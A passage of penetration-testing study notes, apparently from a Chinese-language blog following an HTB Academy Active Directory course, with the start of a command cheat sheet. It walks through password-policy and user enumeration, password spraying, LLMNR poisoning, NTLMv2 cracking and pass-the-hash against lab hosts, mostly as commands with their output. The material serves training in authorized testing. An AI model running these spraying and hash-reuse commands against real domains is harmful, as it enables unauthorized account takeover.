&quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLengthforceLogoff: -9223372036854775808lockoutDuration: -18000000000lockOutObservationWindow: -18000000000lockoutThreshold: 5maxPwdAge: -9223372036854775808minPwdAge: -864000000000minPwdLength: 8modifiedCountAtLastProm: 0nextRid: 1002pwdProperties: 1pwdHistoryLength: 24</code></pre><p>在这里，我们可以看到最小密码长度为8，锁定阈值为5，并且设置了密码复杂性（pwdProperties设置为1）。</p><h2 id="Enumerating-the-Password-Policy-from-Windows"><a href="#Enumerating-the-Password-Policy-from-Windows" class="headerlink" title="Enumerating the Password Policy - from Windows"></a>Enumerating the Password Policy - from Windows</h2><p>如果我们可以从Windows主机向域进行身份验证，我们可以使用内置的Windows二进制文件（如net.exe）来检索密码策略。我们还可以使用各种工具，如PowerView、CrackMapExec移植到Windows、SharpMapExec、SharpView等。 如果我们降落在Windows系统上，无法将工具传输到该系统，或者客户端将我们定位在Windows系统中，但无法将工具转移到该系统上，则使用内置命令会很有帮助。使用内置net.exe二进制文件的一个示例是：</p><pre><code class="cmd-session">C:\htb&gt; net accountsForce user logoff how long after time expires?:       NeverMinimum password age (days):                          1Maximum password age (days):                          UnlimitedMinimum password length:                              8Length of password history maintained:                24Lockout threshold:                                    5Lockout duration (minutes):                           30Lockout observation window (minutes):                 30Computer role:                                        SERVER</code></pre><p>在这里，我们可以收集以下信息： 密码永不过期（密码最长使用期限设置为无限制） 最小密码长度为8，因此可能使用弱密码 锁定阈值为5个错误密码 帐户被锁定30分钟</p><p>此密码策略非常适合密码喷洒。八个字符的最小值意味着我们可以尝试常见的弱密码，如Welcome1。5的锁定阈值意味着我们可以每31分钟尝试2-3次（为了安全）喷雾，而没有锁定任何账户的风险。如果一个帐户被锁定，它将在30分钟后自动解锁（无需管理员手动干预），但我们应该避免不惜一切代价锁定任何帐户。 PowerView在这方面也很方便：</p><h4 id="Using-PowerView"><a href="#Using-PowerView" class="headerlink" title="Using PowerView"></a>Using PowerView</h4><pre><code class="powershell-session">PS C:\htb&gt; import-module .\PowerView.ps1PS C:\htb&gt; Get-DomainPolicyUnicode        : @&#123;Unicode=yes&#125;SystemAccess   : @&#123;MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;                 LSAAnonymousNameLookup=0&#125;KerberosPolicy : @&#123;MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1&#125;Version        : @&#123;signature=&quot;$CHICAGO$&quot;; Revision=1&#125;RegistryValues : @&#123;MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]&#125;Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHI                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.infGPOName        : &#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;GPODisplayName : Default Domain Policy</code></pre><p>PowerView为我们提供了与net accounts命令相同的输出，只是格式不同，但也显示密码复杂性已启用（PasswordComplexity&#x3D;1）。 与Linux一样，我们有许多工具可以在Windows系统上检索密码策略，无论是我们的攻击系统还是客户端提供的系统。PowerView&#x2F;SharpView总是不错的选择，CrackMapExec、SharpMapExec等也是如此。工具的选择取决于评估目标、隐形注意事项、任何防病毒或EDR以及对目标主机的其他潜在限制。让我们介绍几个例子。</p><h2 id="Analyzing-the-Password-Policy"><a href="#Analyzing-the-Password-Policy" class="headerlink" title="Analyzing the Password Policy"></a>Analyzing the Password Policy</h2><p>我们现在已经通过多种方式取消了密码策略。让我们逐一了解INLANEFREIGHT.LOCAL域的策略。</p><ul><li>最小密码长度为8（8很常见，但如今，我们看到越来越多的组织强制使用10-14个字符的密码，这可以为我们删除一些密码选项，但并不能完全缓解密码喷洒矢量）</li><li>帐户锁定阈值为5（通常会看到较低的阈值，如3，甚至根本没有设置锁定阈值）</li><li>锁定持续时间为30分钟（根据组织的不同，这可能会更高或更低），因此，如果我们意外锁定（避免！！）帐户，它将在30分钟窗口过后解锁</li><li>帐户自动解锁（在某些组织中，管理员必须手动解锁帐户）。我们从不想在执行密码喷洒时锁定帐户，但我们特别希望避免在管理员必须手动&#x2F;脚本干预并解锁数百（或数千）个帐户的组织中锁定帐户</li><li>启用了密码复杂性，这意味着用户必须选择包含以下内容的3&#x2F;4的密码：大写字母、小写字母、数字、特殊字符（Password1或Welcome1可以满足此处的“复杂性”要求，但显然仍然是弱密码）。</li></ul><h1 id="default-password-policy"><a href="#default-password-policy" class="headerlink" title="default password policy*"></a>default password policy*</h1><p>创建新域时的默认密码策略如下，许多组织从未更改过此策略：</p><table><thead><tr><th>Policy</th><th>Default Value</th></tr></thead><tbody><tr><td>Enforce password history</td><td>24 days</td></tr><tr><td>Maximum password age</td><td>42 days</td></tr><tr><td>Minimum password age</td><td>1 day</td></tr><tr><td>Minimum password length</td><td>7</td></tr><tr><td>Password must meet complexity requirements</td><td>Enabled</td></tr><tr><td>Store passwords using reversible encryption</td><td>Disabled</td></tr><tr><td>Account lockout duration</td><td>Not set</td></tr><tr><td>Account lockout threshold</td><td>0</td></tr><tr><td>Reset account lockout counter after</td><td>Not set</td></tr></tbody></table><hr><h1 id="Password-Spraying-Making-a-Target-User-List"><a href="#Password-Spraying-Making-a-Target-User-List" class="headerlink" title="-Password Spraying - Making a Target User List-"></a>-Password Spraying - Making a Target User List-</h1><h2 id="SMB-NULL-Session-to-Pull-User-List"><a href="#SMB-NULL-Session-to-Pull-User-List" class="headerlink" title="SMB NULL Session to Pull User List"></a>SMB NULL Session to Pull User List</h2><p>一些可以利用SMB NULL会话和LDAP匿名绑定的工具包括enum4linux、rpcclient和CrackMapExec等。不管使用什么工具，我们都必须进行一些过滤来清理输出，并获得一个仅包含用户名的列表，每行一个。我们可以使用带有-U标志的enum4linux来实现这一点。</p><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux -U 172.16.5.5  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;administratorguestkrbtgtlab_admhtb-studentavazquezpfalconfanthonywdillardlbradfordsgageasanchezdbranchccruznjohnsonmholliday&lt;SNIP&gt;</code></pre><p>使用rpcclient匿名连接后，我们可以使用enumdomusers命令。</p><pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U &quot;&quot; -N 172.16.5.5rpcclient $&gt; enumdomusers user:[administrator] rid:[0x1f4]user:[guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[lab_adm] rid:[0x3e9]user:[htb-student] rid:[0x457]user:[avazquez] rid:[0x458]&lt;SNIP&gt;</code></pre><p>最后，我们可以使用带有–users标志的CrackMapExec。这是一个有用的工具，它还将显示badpwdcount（无效登录尝试），因此我们可以从列表中删除任何接近锁定阈值的帐户。它还显示了baddpwdtime，这是最后一次错误密码尝试的日期和时间，因此我们可以看到一个帐户距离重置其badpwdcount有多近。在具有多个域控制器的环境中，此值在每个域控制器上单独维护。要获得帐户错误密码尝试的准确总数，我们必须查询每个域控制器并使用值的总和，或者查询具有PDC Emulator FSMO角色的域控制器。</p><h4 id="Using-CrackMapExec-–users-Flag"><a href="#Using-CrackMapExec-–users-Flag" class="headerlink" title="Using CrackMapExec –users Flag"></a>Using CrackMapExec –users Flag</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 172.16.5.5 --usersSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez    </code></pre><h2 id="Gathering-Users-with-LDAP-Anonymous"><a href="#Gathering-Users-with-LDAP-Anonymous" class="headerlink" title="Gathering Users with LDAP Anonymous"></a>Gathering Users with LDAP Anonymous</h2><p>当我们发现LDAP匿名绑定时，我们可以使用各种工具来收集用户。一些例子包括 <a href="https://github.com/ropnop/windapsearch">windapsearch</a>和<a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a>。</p><h4 id="Using-ldapsearch-1"><a href="#Using-ldapsearch-1" class="headerlink" title="Using ldapsearch"></a>Using ldapsearch</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;</code></pre><p>像windapsearch这样的工具使这变得更容易（尽管我们仍然应该了解如何创建自己的LDAP搜索过滤器）。在这里，我们可以通过提供一个带有-u标志和-u标志的空白用户名来指定匿名访问，以告诉工具只检索用户。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</code></pre><h2 id="Enumerating-Users-with-Kerbrute"><a href="#Enumerating-Users-with-Kerbrute" class="headerlink" title="Enumerating Users with Kerbrute"></a>Enumerating Users with Kerbrute</h2><p>如域的初始枚举部分所述，如果我们在内部网络中的位置根本无法访问，我们可以使用Kerbrute枚举有效的AD帐户并进行密码喷洒。 该工具使用Kerberos预身份验证，这是一种更快且可能更隐蔽的执行密码喷洒的方法。此方法不生成Windows事件ID 4625:帐户登录失败，或登录失败（经常受到监视）。该工具在没有Kerberos预身份验证的情况下向域控制器发送TGT请求，以执行用户名枚举。如果KDC以错误PRINCIPAL UNKNOWN进行响应，则用户名无效。每当KDC提示进行Kerberos预身份验证时，这表示用户名存在，工具会将其标记为有效。此用户名枚举方法不会导致登录失败，也不会锁定帐户。然而，一旦我们有了有效用户的列表并切换设备来使用此工具进行密码喷洒，失败的Kerberos预身份验证尝试将计入帐户的失败登录帐户，并可能导致帐户锁定，因此无论选择何种方法，我们都必须小心。 让我们使用格式为flast的包含48705个可能的常见用户名的jsmith.txt单词列表来尝试这种方法。统计上可能的用户名GitHub repo是此类攻击的绝佳资源，它包含各种不同的用户名列表，我们可以使用Kerbrute来枚举有效用户名。</p><pre><code class="shell-session">Tanin@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </code></pre><p>我们在12秒内检查了48000多个用户名，发现了50多个有效用户名。使用Ker暴力进行用户名枚举将生成事件ID 4768:请求了Kerberos身份验证票证（TGT）。只有通过组策略启用Kerberos事件日志记录时，才会触发此操作。防御者可以调整他们的SIEM工具，以寻找该事件ID的涌入，这可能表明发生了攻击。如果我们在渗透测试中成功地使用了这种方法，这将是一个很好的建议，可以添加到我们的报告中。 如果我们无法使用上面强调的任何方法创建有效的用户名列表，我们可以返回外部信息收集和搜索公司电子邮件地址，或者使用linkedin2username等工具从公司的LinkedIn页面中混合可能的用户名。</p><h2 id="Credentialed-Enumeration-to-Build-our-User-List"><a href="#Credentialed-Enumeration-to-Build-our-User-List" class="headerlink" title="Credentialed Enumeration to Build our User List"></a>Credentialed Enumeration to Build our User List</h2><p>有了有效的凭据，我们可以使用前面介绍的任何工具来构建用户列表。一种快速简单的方法是使用CrackMapExec。</p><h4 id="Using-CrackMapExec-with-Valid-Credentials"><a href="#Using-CrackMapExec-with-Valid-Credentials" class="headerlink" title="Using CrackMapExec with Valid Credentials"></a>Using CrackMapExec with Valid Credentials</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users</code></pre><h1 id="Spray-Responsibly"><a href="#Spray-Responsibly" class="headerlink" title="-Spray Responsibly-"></a>-Spray Responsibly-</h1><h4 id="Using-a-Bash-one-liner-for-the-Attack"><a href="#Using-a-Bash-one-liner-for-the-Attack" class="headerlink" title="Using a Bash one-liner for the Attack"></a>Using a Bash one-liner for the Attack</h4><pre><code class="shell-session">for u in $(cat valid_users.txt);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done</code></pre><blockquote><ul><li><code>rpcclient</code>: 这是一个用于与远程主机上的 RPC（远程过程调用）服务进行交互的命令行工具。</li><li><code>-U &quot;$u%Welcome1&quot;</code>: 这部分指定了身份验证信息。<code>-U</code> 标志后面的参数包括用户名和密码。<code>$u</code> 可能是一个变量，用于存储用户名。<code>%</code> 是分隔用户名和密码的符号，然后是实际的密码 <code>Welcome1</code>。这个参数用于进行身份验证，让你能够登录到目标系统。</li><li><code>-c &quot;getusername;quit&quot;</code>: 这部分指定了在与远程主机建立连接后要执行的命令。首先，它执行了 <code>getusername</code> 命令，然后执行 <code>quit</code> 命令以退出 <code>rpcclient</code>。</li><li><code>172.16.5.5</code>: 这是远程主机的IP地址，是你要连接到的目标主机。</li></ul></blockquote><h4 id="Using-Kerbrute-for-the-Attack"><a href="#Using-Kerbrute-for-the-Attack" class="headerlink" title="Using Kerbrute for the Attack"></a>Using Kerbrute for the Attack</h4><pre><code class="shell-session">Tanin@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1    </code></pre><p>从Linux执行密码喷洒还有多种其他方法。另一个不错的选择是使用CrackMapExec。这个通用工具接受一个用户名文本文件，在喷射攻击中使用单个密码运行。在这里，我们用grep for+过滤登录失败，并只关注有效的登录尝试，以确保滚动多行输出不会错过任何内容。</p><h4 id="Using-CrackMapExec-amp-Filtering-Logon-Failures"><a href="#Using-CrackMapExec-amp-Filtering-Logon-Failures" class="headerlink" title="Using CrackMapExec &amp; Filtering Logon Failures"></a>Using CrackMapExec &amp; Filtering Logon Failures</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 </code></pre><p>在我们的密码喷洒攻击命中一次（或多次！）后，我们可以使用CrackMapExec针对域控制器快速验证凭据。</p><h4 id="Validating-the-Credentials-with-CrackMapExec"><a href="#Validating-the-Credentials-with-CrackMapExec" class="headerlink" title="Validating the Credentials with CrackMapExec"></a>Validating the Credentials with CrackMapExec</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123</code></pre><h2 id="Local-Administrator-Password-Reuse"><a href="#Local-Administrator-Password-Reuse" class="headerlink" title="Local Administrator Password Reuse"></a>Local Administrator Password Reuse</h2><p>如果您获得本地管理员帐户（或另一个具有特权的本地帐户）的管理访问权限和NTLM密码哈希或明文密码，则可以在网络中的多个主机上进行尝试。由于在自动化部署中使用了黄金映像，并且通过在多个主机上强制执行相同的密码可以轻松管理，因此本地管理员帐户密码的重复使用非常普遍。 CrackMapExec是尝试此攻击的方便工具。值得将目标锁定在SQL或Microsoft Exchange服务器等高价值主机上，因为它们更有可能让高特权用户登录或将其凭据永久保存在内存中。 使用本地管理员帐户时，需要考虑的一个问题是跨帐户重复使用密码或常见的密码格式。如果我们发现本地管理员帐户密码设置为唯一的桌面主机，例如$desktop%@admin123，则可能值得对服务器尝试$server%@admin123。此外，如果我们找到非标准的本地管理员帐户（如bsmith），我们可能会发现密码被重复用于类似名称的域用户帐户。同样的原则也适用于域帐户。如果我们检索名为ajones的用户的密码，那么值得在他们的管理帐户上尝试相同的密码（如果用户有），例如ajones_adm，看看他们是否在重复使用自己的密码。这在域信任情况下也很常见。我们可以获得域a中用户的有效凭据，该凭据对域B中用户名相同或相似的用户有效，反之亦然。 有时，我们可能只从本地SAM数据库中检索本地管理员帐户的NTLM哈希。在这些情况下，我们可以在整个子网（或多个子网）中喷洒NT哈希，以查找具有相同密码集的本地管理员帐户。在下面的示例中，我们尝试使用从另一台机器检索到的内置本地管理员帐户NT哈希来对&#x2F;23网络中的所有主机进行身份验证。–local auth标志将告诉该工具在每台机器上只尝试登录一次，这将消除帐户锁定的任何风险。请确保设置了此标志，这样我们就不会锁定域的内置管理员。默认情况下，如果未设置本地身份验证选项，该工具将尝试使用当前域进行身份验证，这可能会迅速导致帐户锁定。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)</code></pre>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Sighting In, Hunting For A User&lt;/li&gt;
&lt;li&gt;Spray Responsibly&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>AD_Cheat_Sheet</title>
    <link href="https://taninluv.github.io/2023/09/23/AD-Cheat-Sheet/"/>
    <id>https://taninluv.github.io/2023/09/23/AD-Cheat-Sheet/</id>
    <published>2023-09-23T04:19:05.000Z</published>
    <updated>2023-09-23T04:20:10.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>nslookup ns1.inlanefreight.com</code></td><td>Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.</td></tr><tr><td><code>sudo tcpdump -i ens224</code></td><td>Used to start capturing network packets on the network interface proceeding the <code>-i</code> option a Linux-based host.</td></tr><tr><td><code>sudo responder -I ens224 -A</code></td><td>Used to start responding to &amp; analyzing <code>LLMNR</code>, <code>NBT-NS</code> and <code>MDNS</code> queries on the interface specified proceeding the<code> -I</code> option and operating in <code>Passive Analysis</code> mode which is activated using <code>-A</code>. Performed from a Linux-based host</td></tr><tr><td><code>fping -asgq 172.16.5.0/23</code></td><td>Performs a ping sweep on the specified network segment from a Linux-based host.</td></tr><tr><td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td><td>Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding <code>-iL</code>. Then outputs the scan results to the file specified after the <code>-oN</code>option. Performed from a Linux-based host</td></tr><tr><td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td><td>Uses <code>git</code> to clone the kerbrute tool from a Linux-based host.</td></tr><tr><td><code>make help</code></td><td>Used to list compiling options that are possible with <code>make</code> from a Linux-based host.</td></tr><tr><td><code>sudo make all</code></td><td>Used to compile a <code>Kerbrute</code> binary for multiple OS platforms and CPU architectures.</td></tr><tr><td><code>./kerbrute_linux_amd64</code></td><td>Used to test the chosen complied <code>Kebrute</code> binary from a Linux-based host.</td></tr><tr><td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td><td>Used to move the <code>Kerbrute</code> binary to a directory can be set to be in a Linux user’s path. Making it easier to use the tool.</td></tr><tr><td><code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td><td>Runs the Kerbrute tool to discover usernames in the domain (<code>INLANEFREIGHT.LOCAL</code>) specified proceeding the <code>-d</code> option and the associated domain controller specified proceeding <code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="LLMNR-x2F-NTB-NS-Poisoning"><a href="#LLMNR-x2F-NTB-NS-Poisoning" class="headerlink" title="LLMNR&#x2F;NTB-NS Poisoning"></a>LLMNR&#x2F;NTB-NS Poisoning</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>responder -h</code></td><td>Used to display the usage instructions and various options available in <code>Responder</code> from a Linux-based host.</td></tr><tr><td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td><td>Uses <code>hashcat</code> to crack <code>NTLMv2</code> (<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist.</td></tr><tr><td><code>Import-Module .\Inveigh.ps1</code></td><td>Using the <code>Import-Module</code> PowerShell cmd-let to import the Windows-based tool <code>Inveigh.ps1</code>.</td></tr><tr><td><code>(Get-Command Invoke-Inveigh).Parameters</code></td><td>Used to output many of the options &amp; functionality available with <code>Invoke-Inveigh</code>. Peformed from a Windows-based host.</td></tr><tr><td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td><td>Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file.</td></tr><tr><td><code>.\Inveigh.exe</code></td><td>Starts the <code>C#</code> implementation of <code>Inveigh</code> from a Windows-based host.</td></tr><tr><td><code>$regkey = &quot;HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces&quot; Get-ChildItem $regkey |foreach &#123; Set-ItemProperty -Path &quot;$regkey\$($_.pschildname)&quot; -Name NetbiosOptions -Value 2 -Verbose&#125;</code></td><td>PowerShell script used to disable NBT-NS on a Windows host.</td></tr></tbody></table><h1 id="Password-Spraying-amp-Password-Policies"><a href="#Password-Spraying-amp-Password-Policies" class="headerlink" title="Password Spraying &amp; Password Policies"></a>Password Spraying &amp; Password Policies</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>#!/bin/bash  for x in &#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;     do echo $x; done</code></td><td>Bash script used to generate <code>16,079,616</code> possible username combinations from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td><td>Uses <code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host.</td></tr><tr><td><code>rpcclient -U &quot;&quot; -N 172.16.5.5</code></td><td>Uses <code>rpcclient</code> to discover information about the domain through <code>SMB NULL</code> sessions. Performed from a Linux-based host.</td></tr><tr><td><code>rpcclient $&gt; querydominfo</code></td><td>Uses <code>rpcclient</code> to enumerate the password policy in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>enum4linux  -P 172.16.5.5</code></td><td>Uses <code>enum4linux</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td><td>Uses <code>enum4linux-ng</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the <code>-oA</code> option.</td></tr><tr><td><code>ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLength</code></td><td>Uses <code>ldapsearch</code> to enumerate the password policy in a  target Windows domain from a Linux-based host.</td></tr><tr><td><code>net accounts</code></td><td>Used to enumerate the password policy in a Windows domain from a Windows-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1</code></td><td>Uses the Import-Module cmd-let to import the <code>PowerView.ps1</code> tool from a Windows-based host.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>Used to enumerate the password policy in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>enum4linux -U 172.16.5.5  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;</code></td><td>Uses <code>enum4linux</code> to discover user accounts in a target Windows domain, then leverages <code>grep</code> to filter the output to just display the user from a Linux-based host.</td></tr><tr><td><code>rpcclient -U &quot;&quot; -N 172.16.5.5  rpcclient $&gt; enumdomuser</code></td><td>Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 --users</code></td><td>Uses <code>CrackMapExec</code> to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;</code></td><td>Uses <code>ldapsearch</code> to discover users in a target Windows doman, then filters the output using <code>grep</code> to show only the <code>sAMAccountName</code> from a Linux-based host.</td></tr><tr><td><code>./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</code></td><td>Uses the python tool <code>windapsearch.py</code> to discover users in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>for u in $(cat valid_users.txt);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done</code></td><td>Bash one-liner used to perform a password spraying attack using <code>rpcclient</code> and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output cleaner.</td></tr><tr><td><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</code></td><td>Uses <code>kerbrute</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</code></td><td>Uses <code>CrackMapExec</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using <code>grep</code>.</td></tr><tr><td><code> sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td><td>Uses <code>CrackMapExec</code> to validate a set of credentials from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</code></td><td>Uses <code>CrackMapExec</code> and the -<code>-local-auth</code> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using <code>grep</code>.</td></tr><tr><td><code>Import-Module .\DomainPasswordSpray.ps1</code></td><td>Used to import the PowerShell-based tool <code>DomainPasswordSpray.ps1</code> from a Windows-based host.</td></tr><tr><td><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td><td>Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host.</td></tr></tbody></table><h1 id="Enumerating-Security-Controls"><a href="#Enumerating-Security-Controls" class="headerlink" title="Enumerating Security Controls"></a>Enumerating Security Controls</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-MpComputerStatus</code></td><td>PowerShell cmd-let used to check the status of <code>Windows Defender Anti-Virus</code> from a Windows-based host.</td></tr><tr><td><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></td><td>PowerShell cmd-let used to view <code>AppLocker</code> policies from a Windows-based host.</td></tr><tr><td><code>$ExecutionContext.SessionState.LanguageMode</code></td><td>PowerShell script used to discover the <code>PowerShell Language Mode</code> being used on a Windows-based host. Performed from a Windows-based host.</td></tr><tr><td><code>Find-LAPSDelegatedGroups</code></td><td>A <code>LAPSToolkit</code> function that discovers <code>LAPS Delegated Groups</code> from a Windows-based host.</td></tr><tr><td><code>Find-AdmPwdExtendedRights</code></td><td>A <code>LAPSTookit</code> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with <code>All Extended Rights</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-LAPSComputers</code></td><td>A <code>LAPSToolkit</code> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Credentialed-Enumeration"><a href="#Credentialed-Enumeration" class="headerlink" title="Credentialed 